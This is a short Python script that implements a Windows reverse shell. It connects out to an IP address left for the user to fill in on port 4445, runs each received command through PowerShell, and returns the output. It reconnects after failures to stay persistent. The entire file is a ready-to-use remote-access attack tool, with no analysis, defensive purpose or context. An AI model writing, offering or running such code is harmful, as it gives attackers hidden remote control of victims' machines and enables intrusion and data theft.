import socket, subprocess, time

def connect_back(ip, port):
    try:
        s = socket.socket()
        s.connect((ip, port))
        s.send(b'Connected!\n')

        while True:
            cmd = s.recv(4096).decode('utf-8').strip()

            if cmd.lower() == 'exit':
                break

            output = subprocess.run(["powershell.exe", "-NoProfile", "-Command", cmd],
                                    stdout=subprocess.PIPE,
                                    stderr=subprocess.PIPE,
                                    stdin=subprocess.DEVNULL,
                                    shell=False)

            response = output.stdout + output.stderr
            s.send(response if response else b' ')
            time.sleep(1)
    except Exception as e:
        print(f"Connection error: {e}")
        time.sleep(10)
        connect_back(ip, port)

connect_back('Your IP', 4445)
